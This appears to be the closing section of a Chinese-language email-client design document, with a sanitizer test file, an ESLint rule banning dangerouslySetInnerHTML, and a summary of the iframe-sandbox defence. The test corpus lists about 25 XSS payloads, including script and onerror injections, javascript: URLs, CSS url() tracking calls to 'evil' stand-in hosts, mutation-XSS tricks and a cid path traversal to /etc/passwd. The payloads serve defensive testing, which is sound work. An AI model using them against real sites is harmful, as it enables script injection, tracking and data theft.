// apps/server/src/mime/sanitize.test.ts
const XSS_CORPUS = [
  `<script>alert(1)</script>`,
  `<img src=x onerror=alert(1)>`,
  `<a href="javascript:alert(1)">x</a>`,
  `<a href="JaVaScRiPt:alert(1)">x</a>`,
  `<a href="&#106;avascript:alert(1)">x</a>`,
  `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
  `<iframe src="https://evil.example"></iframe>`,
  `<form action="/api/accounts"><input name=x><button formaction="https://evil">go</button></form>`,
  `<svg><script>alert(1)</script></svg>`,
  `<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>`,
  `<div style="background:url(https://evil/track)">x</div>`,
  `<div style="background-image:url(https://evil/track)">x</div>`,
  `<style>@import url(https://evil/x.css)</style>`,
  `<div style="behavior:url(#default#time2)">x</div>`,
  `<div style="width:expression(alert(1))">x</div>`,
  `<base href="https://evil/">`,
  `<meta http-equiv="refresh" content="0;url=https://evil">`,
  `<link rel="stylesheet" href="https://evil/x.css">`,
  `<object data="https://evil"></object>`,
  `<embed src="https://evil">`,
  `<template><script>alert(1)</script></template>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
  `<div data-evil="x">x</div>`,                        // ALLOW_DATA_ATTR 必须为 false
  `<a href="vbscript:msgbox(1)">x</a>`,
  `<img src="cid:../../etc/passwd">`,                  // cid 路径穿越
];

describe('sanitizeEmailHtml', () => {
  it.each(XSS_CORPUS)('净化 %#', (input) => {
    const out = sanitizeEmailHtml(input, CTX);
    expect(out.html).not.toMatch(/<script|<iframe|<form|<object|<embed|<base|<link|<meta|<style|<svg|<math/i);
    expect(out.html).not.toMatch(/\son\w+\s*=/i);
    expect(out.html).not.toMatch(/javascript:|vbscript:|data:text\/html/i);
    expect(out.html).not.toMatch(/url\s*\(|@import|expression\s*\(|behavior\s*:/i);
    expect(out.html).not.toMatch(/\sdata-(?!fm-)/i);
  });
});

describe('cid 重写', () => {
  it('尖括号 / 大小写 / URL 编码都能匹配', () => { /* … */ });
  it('未命中时换成占位而不是保留 cid:', () => { /* … */ });
});

describe('引用折叠', () => {
  it.each([
    '在 2026年9月1日，张三 写道：',
    '------------------ 原始邮件 ------------------',
    'On Mon, Sep 1, 2026 at 10:00 AM Alice <a@x.com> wrote:',
    '发件人: 李四 <b@qq.com>',
  ])('识别中英文引用边界: %s', (marker) => { /* … */ });
});
```

再加一条 ESLint 规则，防止有人在别处又开一条渲染路径：

```js
// eslint.config.js
{
  files: ['apps/web/src/**/*.tsx'],
  rules: {
    'react/no-danger': 'error',   // dangerouslySetInnerHTML 一律禁止
  },
}
```

搜索结果里的关键词高亮**不是**这条规则的例外：高亮走 React 元素拼接（把 snippet 按命中位置切成数组再渲染 `<mark>`），不走 innerHTML。

---

## 12. 一句话总结

> 邮件正文永远只出现在一个没有 `allow-scripts` 的 iframe 的 `srcdoc` 里；服务端有且只有一份 allow-list 净化实现；白名单里没有 `script` / `iframe` / `form` / `style`；四道防线里任意一道失效都不足以造成 XSS。
